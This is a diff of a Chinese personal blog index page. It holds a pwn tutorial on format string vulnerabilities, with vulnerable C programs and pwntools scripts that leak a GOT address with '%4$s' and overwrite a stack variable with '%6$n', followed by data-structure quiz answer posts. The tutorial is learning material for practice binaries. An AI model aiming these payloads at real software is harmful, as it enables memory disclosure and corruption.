+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-19T19:44:06+08:00">
+                2018-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="什么是格式化字符串？"><a href="#什么是格式化字符串？" class="headerlink" title="什么是格式化字符串？"></a>什么是格式化字符串？</h1><p>这个问题我相信学过c语言的都不陌生，我们在使用printf一类（比如：sprintf、fprintf等）的函数时经常会用到这个东西，他的样子很好识别，一般就是%后面跟着一些字符，比如下面我们printf函数的第一个参数</p>
+<pre><code>#include&lt;stdio.h&gt;
+int main()
+{
+    printf(&quot;this is a format string %s&quot; , &quot;yes&quot;);
+    return 0;
+}
+</code></pre><p>它主要是用一个说明符（在上面的例子中是s）来告诉程序该以何种格式来输出，而后为我们在输出中按格式填充入我们在后面的内容</p>
+<p>下面是几个常见的说明符</p>
+<pre><code>%d - 十进制 - 输出十进制整数
+%s - 字符串 - 从内存中读取字符串
+%x - 十六进制 - 输出十六进制数
+%c - 字符 - 输出字符
+%p - 指针 - 指针地址
+%n - 到目前为止所写的字符数
+</code></pre><p>这里前几个都是用来打印的，最后一个却是一个“异类”，这家伙的作用是写入到某个内存区域到现在为止写过的字符个数。注意要和%n$n区别开来，这个的作用是“选择”，举个例子讲，%3$s，这个的意思就是将第三个我们的填充物以%s的格式打印出来。<br>因为这些说明符的种种特性，我们可以使用它们来干一些“坏事”</p>
+<h1 id="漏洞在哪？"><a href="#漏洞在哪？" class="headerlink" title="漏洞在哪？"></a>漏洞在哪？</h1><p>如果我想让你写一段代码打印出我输入的字符串你会怎么办？我相信大多数人会写出下面的代码：</p>
+<pre><code>char str[100]
+scanf(&quot;%s&quot;,str)
+printf(&quot;%s&quot;,str)
+</code></pre><p>代码看上去很简单嘛，但总有人喜欢偷懒，他会写成如下的形式：</p>
+<pre><code>printf(str)
+</code></pre><p>这就出问题了，一般的函数，传入的参数都是固定的，但printf却不同，因为它要求有一个format string，这个format string就是它的身家性命，这东西就决定了它后面有多少的参数，而就算是你的format string后面没有足够的参数，他也会认为“你有足够的参数”，然后自动读取栈上的数据，按照你的format打印出来。那我们就可以玩点有趣的东西了，我们先给出个程序（程序代码来自ctf wiki）</p>
+<pre><code>#include &lt;stdio.h&gt;
+int main() {
+  char s[100];
+  int a = 1, b = 0x22222222, c = -1;
+  scanf(&quot;%s&quot;, s);
+  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);
+  printf(s);
+  return 0;
+}
+</code></pre><p>可以看到这个程序就存在格式化字符串的漏洞。程序逻辑很简单，在我们输入s后，它先是“安全”的打印了s的内容，然后又直接打印了s，我们是这运行时输入这样一段数据</p>
+<pre><code>AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
+</code></pre><p>然后我们就非（li）常（suo）惊（ying）讶（dang）的发现程序给我们输出这些内容：</p>
+<pre><code>00000001.22222222.ffffffff.AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
+AAAAffff5160,c2,f7e036bb,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825
+</code></pre><p>很显然程序把原本不用该暴露给我们的东西都吐了出来，而输出的第四部分41414141大家也应该很清楚，就是我们的AAAA</p>
+<h1 id="泄漏任意内存地址"><a href="#泄漏任意内存地址" class="headerlink" title="泄漏任意内存地址"></a>泄漏任意内存地址</h1><p>通过前几次的学习我们知道了got表可是个好东西，当时我们想法设法的泄漏出got表内容进而拿到libc里面所有我们想要的东西。而通过这个漏洞我们可以非常轻松的实现got表的泄漏</p>
+<p>还是以上面的程序为例，程序中存在scanf函数，那我们就泄漏这个函数的got表地址。</p>
+<p>首先先看一下我们上面的测试，刚才的测试可不是仅仅为了演示漏洞，我们还可以看见程序给我们的的输出中41414141和我们的输入“AAAA”实际上是一样的，而41414141也就是第五个打印的部分，那也就是说，前面的我们实际上都不需要，我们借助上面调皮的%n就可以完美实现打印这个东西了。</p>
+<p>话不多说，上脚本</p>
+<pre><code>from pwn import *
+sh = process(&apos;./leakmemory&apos;)
+leakmemory = ELF(&apos;./leakmemory&apos;)
+__isoc99_scanf_got = leakmemory.got[&apos;__isoc99_scanf&apos;]
+print hex(__isoc99_scanf_got)
+payload = p32(__isoc99_scanf_got) + &apos;%4$s&apos;
+print payload
+gdb.attach(sh)
+sh.sendline(payload)
+sh.recvuntil(&apos;%4$s\n&apos;)
+print hex(u32(sh.recv()[4:8])) 
+sh.interactive()
+
+0x804a014
+\x14\xa0\x0%4$s
+[*] running in new terminal: /usr/bin/gdb -q  &quot;./leakmemory.dms&quot; 8086 -x &quot;/tmp/pwn2rdIM1.gdb&quot;
+[+] Waiting for debugger: Done
+0xf7de20c0
+[*] Switching to interactive mode
+</code></pre><p>成功拿到了scanf在got表中的地址</p>
+<h1 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h1><p>那有了泄漏任意地址的方式，那我们有没有利用这个来实现覆盖地址呢？其实是可以的，这里我们要用到关于%n的知识，其实上面说过了，但还是再列一遍</p>
+<p><strong>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</strong></p>
+<p>这里应该分两部分，但今天有点事耽搁了，所以就先简单的看看第一部分，栈上的内存覆盖吧，程序如下（依旧来自ctf wiki）</p>
+<pre><code>/* example/overflow/overflow.c */
+#include &lt;stdio.h&gt;
+int a = 123, b = 456;
+int main() {
+  int c = 789;
+  char s[100];
+  printf(&quot;%p\n&quot;, &amp;c);
+  scanf(&quot;%s&quot;, s);
+  printf(s);
+  if (c == 16) {
+    puts(&quot;modified c.&quot;);
+  } else if (a == 2) {
+    puts(&quot;modified a for a small number.&quot;);
+  } else if (b == 0x12345678) {
+    puts(&quot;modified b for a big number!&quot;);
+  }
+  return 0;
+}
+</code></pre><p>简单看看，程序会输出变量c的地址，然后有个格式化字符串的漏洞，本来if判断c是不成立的，那我们就利用这个漏洞来改变c的值来让它符合。</p>
+<p>首先还是用我们刚才的泄漏栈变量的方式（也就是上面的方法）确定偏移</p>
+<pre><code>0xfff5de4c
+AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
+AAAAfff5dde8,c2,f7e7a6bb,fff5de0e,fff5df0c,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78
+</code></pre><p>可以看到偏移是6，那我们就知道了payload最后应该是%6$n，我们的目标是让c变成16，我们一开始输入的是拿p32()处理过的c的地址，只有4位，还缺12位，我们就补个%012d，让程序随便打12个数据就好了，分析完毕，上脚本！</p>
+<pre><code>from pwn import *
+sh = process(&apos;./overwrite.dms&apos;)
+c_addr = int(sh.recvuntil(&apos;\n&apos;, drop=True), 16)
+print hex(c_addr)
+payload = p32(c_addr) + &apos;%012d&apos; + &apos;%6$n&apos;
+print payload
+#gdb.attach(sh)
+sh.sendline(payload)
+print sh.recv()
+sh.interactive()
+</code></pre><p>successful！</p>
+<p>那今天就先到这里了～明天估计会有格式化字符串的第二篇，以及栈溢出的更多的玩法，具体还是要看我的学习进度了</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/数据结构基础-顺序表/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/19/数据结构基础-顺序表/" itemprop="url">数据结构基础--顺序表</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-19T19:30:37+08:00">
+                2018-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>对于顺序存储的长度为N的线性表，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。</strong></p>
+<p>答案为<em>T</em>，顺序存储的线性表可以利用偏移轻松拿到每一个元素，但是如果要增加一个元素的话则需要把之后的所有的元素都后移一位。</p>
+<p><strong>若某线性表最常用的操作是存取任一指定序号的元素和在最后进行插入和删除运算，则利用顺序表存储最节省时间。</strong></p>
+<p>答案为<em>T</em>，因为比起链表形式找一个元素需要遍历，顺序表直接用偏移就ok了，而且如果只是在最后进行插入删除的话也无需移动大量元素</p>
+<p><strong>对于顺序存储的长度为N的线性表，删除第一个元素和插入最后一个元素的时间复杂度分别对应为O(1)和O(N)。</strong></p>
+<p>答案为<em>F</em>，删除第一个元素需要把之后所有的元素依次提前一个，所以应该为N，而插入最后一个元素直接在最后插入即可</p>
+<p><strong>(neuDS)在顺序表中逻辑上相邻的元素，其对应的物理位置也是相邻的。</strong></p>
+<p>答案为<em>T</em>，线性表是随机存储的，所以物理位置是相邻的</p>
+<p><strong>(neuDS)所谓随机存取，就是通过首地址和元素的位序号值可以在O(1)的时间内找到指定的元素。</strong></p>
+<p>答案为<em>T</em>，这个在之前的链表选择判断里说过了</p>
+<p><strong>(neuDS)顺序存储的线性表不支持随机存取。</strong></p>
+<p>答案为<em>F</em>，和上边的那个一样</p>
+<p><strong>(neuDS)在顺序表上进行插入、删除操作时需要移动元素的个数与待插入或待删除元素的位置无关。</strong></p>
+<p>答案为<em>F</em>，显然是错误的，因为你每次的插入删除操作都是要移动后面所有的元素的</p>
+<p><strong>对于顺序存储的长度为N的线性表，访问结点和增加结点的时间复杂度为：</strong></p>
+<p>答案为<em>O(1), O(N)</em>，访问结点直接用偏移，而增加结点需要把这个元素后面的所有元素都移动。</p>
+<p><strong>在N个结点的顺序表中，算法的时间复杂度为O(1)的操作是：</strong></p>
+<p>答案为<em>访问第i个结点（1≤i≤N）和求第i个结点的直接前驱（2≤i≤N）</em>，随机存储不再说了</p>
+<p><strong>若某线性表最常用的操作是存取任一指定序号的元素和在最后进行插入和删除运算，则利用哪种存储方式最节省时间？</strong></p>
+<p>答案为<em>顺序表</em>，参考上面，懒得再说了</p>
+<p><strong>顺序表中第一个元素的存储地址是100，每个元素的长度为2，则第5个元素的地址是（ ）。</strong></p>
+<p>答案为<em>108</em>，100是第一个元素的，第二个是102，依次类推，逆向的应该都懂</p>
+<p><strong>(neuDS)线性表的顺序存储结构是一种( ) </strong></p>
+<p>答案为<em>随机存取的存储结构</em>，懒得说了</p>
+<p><strong>(neuDS)一个顺序表所占用的存储空间大小与( )无关。</strong></p>
+<p>答案为<em>元素的存放顺序</em>，其实主要取决于元素的多少和元素的类型（包括元素所含有的子元素的类型）</p>
+<p><strong>(neuDS)要将一个顺序表{a0,a1,……,an−1}中第i个数据元素ai(0≤i≤n-1)删除，需要移动（ ）个数据元素。</strong></p>
+<p>答案为<em>n-i-1 </em>，因为要删除第i个，所以它后面的元素你都要向前移动一个，而由于顺序表是0开始的，最后一个元素是n-1，所以也就是n-1-i，也就是答案了</p>
+<p><strong>若长度为n的线性表采用顺序存储结构，那么删除它的第i个数据元素之前，需要它一次向前移动（）个数据元素。</strong></p>
+<p>答案为<em>n-i </em>和上面的一样</p>
+<p><strong>若长度为n的线性表采用顺序结构，在第i个数据元素之前插入一个元素，需要它依次向后移动（）个元素</strong></p>
+<p>答案为<em>n-i+1</em>，要注意插入和删除的区别，因为删除时，你移动的只是原来位置元素的后面的元素，而插入的话除了原来元素的后面的元素，还要多移动一个原来的元素，所以也就是要+1了</p>
+<p><strong>线性表L=（a1, a2 ,……，an ）用一维数组表示，假定删除线性表中任一元素的概率相同（都为1/n），则删除一个元素平均需要移动元素的个数是（）。</strong></p>
+<p>答案为<em>(n-1)/2 </em>，其实这个问题和1+2+3+…+9有点像，因为第n个和倒数第n个总能凑成一对，然后除2就完了，当然你要是想不通的话也可以用等差数列做…</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/数据结构基础-链表/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/18/数据结构基础-链表/" itemprop="url">数据结构基础--链表</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T20:32:37+08:00">
+                2018-11-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>在具有N个结点的单链表中，访问结点和增加结点的时间复杂度分别对应为O(1)和O(N)。 (1分)</strong></p>
+<p>答案应为<em>F</em>，单链表访问结点因为只能够一个一个的看，所以并不能像数组存储那样时间复杂度那么低，它的时间复杂度应该为 <em>o(n)</em>，实际上，<em>单链表的几个常见操作时间复杂度都是o(n)的</em></p>
+<p><strong>若用链表来表示一个线性表，则表中元素的地址一定是连续的。 (1分)</strong></p>
+<p>答案应为<em>F</em>，链表存储地址并不是连续的，链表各个结点之间的联系是通过指针来实现的，指针指到的位置就算是链表的上下部分，但实际上指针具体指向哪个地址就是随意的了</p>
+<p><strong>将长度分别为m,n的两个单链表合并为一个单链表的时间复杂度为O(m+n)。 (1分)</strong></p>
+<p>答案应为<em>F</em>，这里因为自己也曾经和有序表的合并搞混过，所以把两种一块拿过来仔细说说</p>
+<ul>
+<li>普通单链表合并，只需要遍历第一个单链表找到结尾，把第二个单链表直接接上就完事了，<em>时间复杂度为o(n)</em></li>
+<li>有序合并并且合并后仍为有序，我们需要遍历两个链表，对data进行比较决定顺序，所以 <em>时间复杂度应该为o(n+m)</em></li>
+</ul>
+<p><strong>附加题目—将N条长度均为M的有序链表进行合并，合并以后的链表也保持有序，时间复杂度为()?</strong></p>
+<p>这应该说是上一个题目的难度up版，答案为o(n*m*logN)，至于具体过程我们在下面仔细</p>
+<ul>
+<li>取每个链表的第一个元素，组成一个数组，然后对数组进行排序，这是我们的第一步的时间复杂度<em>O(NlogN)</em></li>
+<li>将我们排序后数组的第一个节点视为新链表的第一个节点，将剩余链表的结点每次取一个用二叉搜索的方式插入数组，时间复杂度为<em>O(logN)</em></li>
+<li>重复上一步，因为第一步我们已经去除了m个结点，所以重复的次数应当是N*M-1 次，最终的时间复杂度应该是<em>O(NlogN) +  (M - 1) \</em> N * O(logN)= M * N* O(logN)*</li>
+</ul>
+<p><strong>(neuDS)单链表不是一种随机存取的存储结构。 (1分)</strong><br>答案应为<em>F</em>，这个很简单，可以理解为<em>能够通过地址的偏移直接得到相应位置的就是随机存储</em>，比如线性表，不能的就是非随机存储，比如单链表</p>
+<p><strong>设h为不带头结点的单向链表。在h的头上插入一个新结点t的语句是：</strong></p>
+<p>答案应为<em>t->next=h; h=t</em>;因为我们要在头部插入一个新的结点，那我们就需要<em>将新的头部指向原来的头部</em>，而新的单链表的h应该就变成了t，所以有了第二句</p>
+<p><strong>在单链表中，若p所指的结点不是最后结点，在p之后插入s所指结点，则执行</strong></p>
+<p>答案应为<em>s->next=p->next; p->next=s;</em>，因为要插入一个结点s，所以我们要做的第一件事就是把<em>插入前结点的信息先处理，防止信息丢失</em>，所以我们先让s的next指向了p的next，保留下了p的信息，之后让p的next指向s实现插入就ok了  </p>
+<p><strong>带头结点的单链表h为空的判定条件是：</strong></p>
+<p>答案应为<em>h->next == NULL;</em>，因为带头结点的单链表比普通的链表多了个“头”，所以我们的“头”之后才是真正的结点，所以没有结点的条件也就是h的next为NULL</p>
+<p><strong>将两个结点数都为N且都从小到大有序的单向链表合并成一个从小到大有序的单向链表，那么可能的最少比较次数是：</strong></p>
+<p>答案应为<em>N</em>，很简单，假设第一个链表的最大值比第二个链表的最小值小，那么比较的时候其实只<em>进行了第一个链表的N个元素和元素和第二个链表的第一个元素的比较的过程</em>，后面就不用再比较了，所以比较次数其实最小就是N</p>
+<p><strong>线性表若采用链式存储结构时，要求内存中可用存储单元的地址</strong></p>
+<p>答案为<em>连续或不连续都可以</em>，上面提过这个问题了，不啰嗦了</p>
+<p><strong>在具有N个结点的单链表中，实现下列哪个操作，其算法的时间复杂度是O(N)？</strong></p>
+<p>答案为<em>遍历链表和求链表的第i个结点</em>，很简单，不说了</p>
+<p><strong>对于一个具有N个结点的单链表，在给定值为x的结点后插入一个新结点的时间复杂度为 </strong></p>
+<p>答案为<em>O(N)</em>，很简单，我们需要首先遍历找到这个结点</p>
+<p><strong>链表具有的特点是：</strong></p>
+<ul>
+<li>插入、删除不需要移动元素</li>
+<li>不必事先估计存储空间</li>
+<li>所需空间与线性长度成正比</li>
+</ul>
+<p><strong>在一个含有n个结点的有序单链表中插入一个新结点，使单链表仍然保持有序的算法的时间复杂度是（ ）。</strong></p>
+<p>答案还是<em>O(n)</em>，也很简单，因为你还是要遍历单链表来找到你想要的位置</p>
+<p><strong>将长度为n的单链表连接在长度为m的单链表之后的算法的时间复杂度为（ ）。</strong></p>
+<p>答案是<em>O(m)</em>，上面也提过了，不说了</p>
+<p><strong>(neuDS)在单链表中，增加一个头结点的最终目的是为了( )。</strong></p>
+<p>说白了就是<em>方便运算</em>而已</p>
+<p><strong>在单链表中，要删除某一指定结点，必须先找到该结点的（）。</strong></p>
+<p>答案为<em>直接前驱</em>，很简单啊，还是之前提的思想，不管是加还是删，你得保证人家原来的信息都有，直接前驱可是保留着后继的信息的</p>
+<p><strong>以下关于链式存储结构的叙述中，（）是正确的。</strong></p>
+<ul>
+<li>结点除自身信息外还包括指针域，因此存储密度小于顺序存储结构</li>
+<li>逻辑上相邻的结点物理上不必邻接</li>
+<li>插入、删除运算操作方便，不必移动结点</li>
+</ul>
+<p><strong>线性链表具有的特点是（）。</strong></p>
+<ul>
+<li>不必事先估计所需存储空间大小</li>
+<li>插入与删除时不必移动元素</li>
+<li>所需空间与线性长度成正比</li>
+</ul>
+<p><strong>线性表若采用链式存储结构时，要求内存中可用存储单元的地址（）。</strong></p>
+<p>答案应为<em>经常需要进行插入和删除操作</em>，因为比起之后的元素都移动，不如遍历找到后简单的指针变化</p>
+<p><strong>线性表若采用链式存储结构时，要求内存中可用存储单元的地址（）。</strong></p>
+<p>答案是<em>连续或不连续都可以</em>，前面提过了</p>
+<p><strong>不带表头附加结点的单链表为空的判断条件是头指针head满足条件（）。</strong></p>
+<p>答案是<em>head==NULL</em>，之前说过带表头的，那不带表头的也就是第一个结点是头，那为空的条件也就是头为NULL呗</p>
+<p><strong>可以用带表头附加结点的链表表示线性表，也可以用不带头结点的链表表示线性表，前者最主要的好处是（）。</strong></p>
+<p>答案为<em>使空表和非空表的处理统一</em>，说白了就是方便</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/数据结构基础-队列/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/18/数据结构基础-队列/" itemprop="url">数据结构基础--队列</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-18T20:32:37+08:00">
+                2018-11-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/数据结构/" itemprop="url" rel="index">
+                    <span itemprop="name">数据结构</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="数据结构复习—队列"><a href="#数据结构复习—队列" class="headerlink" title="数据结构复习—队列"></a>数据结构复习—队列</h2><p><strong> 1-1所谓“循环队列”是指用单向循环链表或者循环数组表示的队列。 (1分)</strong></p>
+<p>可以将向量空间想象成一个圆环，它首尾相接，这样的向量就是循环向量，如果我们的队列存储在这样的结构里我们就说是循环队列，当然在编程中我们可以用单链表或者是数组来表示它，但却不能划上等号</p>
+<p><strong>1-2在用数组表示的循环队列中，front值一定小于等于rear值。 (1分)</strong></p>
+<p>在循环队列中，front的值和rear的值有三种情况</p>
+<ul>
+<li>front的值小于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-219fb91ec9d6ec4b.png?imageMogr2/auto-orient/" alt=""></li>
+<li>front的值等于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-b177be6bcccd0238.png?imageMogr2/auto-orient/" alt=""></li>
+<li>front的值大于rear的值<br><img src="https://upload-images.jianshu.io/upload_images/8219030-756e097236623702.png?imageMogr2/auto-orient/" alt=""></li>
+</ul>
+<p><strong>1-3不论是入队列操作还是入栈操作,在顺序存储结构上都需要考虑”溢出”情况。 (2分)</strong></p>
+<p>这一点不用多说，在顺序存储结构中存储的容量是一定的，一定要考虑溢出的情况</p>
+<p><strong>2-1为解决计算机主机与打印机之间速度不匹配问题，通常设置一个打印数据缓冲区，主机将要输出的数据依次写入该缓冲区，而打印机则依次从该缓冲区中取出数据。该缓冲区的逻辑结构应该是？ (1分)</strong></p>
+<p>答案应为 <em>队列</em> ，由于打印机的缓冲区要做的是“先进来的先打印”这样一个操作逻辑，自然需要我们 <em>先进先出</em> 的队列来实现了</p>
+<p><strong>2-2若已知一队列用单向链表表示，该单向链表的当前状态（含3个对象）是：1->2->3，其中x->y表示x的下一节点是y。此时，如果将对象4入队，然后队列头的对象出队，则单向链表的状态是： (1分)</strong></p>
+<p>答案应为 <em>2->3->4</em> ，因为1是对头，3是队尾，当4入队后排在4后 变为队尾，1排队成功出队，2变为队头</p>
+<p><strong>2-3在一个链队列中，front和rear分别为头指针和尾指针，则插入一个结点s的操作为（ ）。 (2分)</strong></p>
+<p>答案应为 <em>rear->next=s;rear=s;</em> ，因为插入结点，所以rear的next应该是s，但s一旦入队s就变成了队尾，所以紧接着rear=s</p>
+<p>**2-4依次在初始为空的队列中插入元素a,b,c,d以后，紧接着做了两次删除操作，此时的队头元素是（ ）。 (2分)</p>
+<p>答案应为 <em>c</em> ，还是因为队列是 <em>先进先出</em> 的，所以a、b先进来，a、b先出去</p>
+<p><strong>2-5在一个不带头结点的非空链式队列中,假设f和r分别为队头和队尾指针,则插入s所指的结点运算是( )。 (2分)</strong></p>
+<p>答案应为 <em>r->next=s; r=s;</em> ，解析和第三题相同，在这里有没有头结点关系不大</p>
+<p><strong>2-6若用大小为6的数组来实现循环队列，且当前front和rear的值分别为0和4。当从队列中删除两个元素，再加入两个元素后，front和rear的值分别为多少？ (2分)</strong></p>
+<p>答案为 <em>2和6</em> ，当删除两个元素时，front+2，而当加入两个元素时，rear+2</p>
+<p>**2-7如果循环队列用大小为m的数组表示，且用队头指针front和队列元素个数size代替一般循环队列中的front和rear指针来表示队列的范围，那么这样的循环队列可以容纳的元素个数最多为： (2分)</p>
+<p>答案应为 <em>m</em> ，因为队列有m个时，一旦循环起来我们会遇到front和rear相等的情况，而我们没有办法判断到底是队列为空还是队列已满，根本原因是 <em>我们的队列有m+1种情况，而我们只有m种状态</em> ，所以我们可以用两种方法避免：</p>
+<ul>
+<li>size进行标记判断是否队列已满</li>
+<li>只保存m-1个值，那队列就只有m中状态，恰好可以表示完全</li>
+</ul>
+<p><strong>2-8如果循环队列用大小为m的数组表示，队头位置为front、队列元素个数为size，那么队尾元素位置rear为： (2分)</strong></p>
+<p>答案应为 <em>(front+size-1)%m</em> ，公式，很好想，背下来就好了</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/pwn学习（3）ROP-Emporium32位练习/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -624,190 +2223,11 @@ p.interactive()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/18/pwn学习（1）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Asa9ao">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Asa9ao">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/18/pwn学习（1）/" itemprop="url">pwn学习（1）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
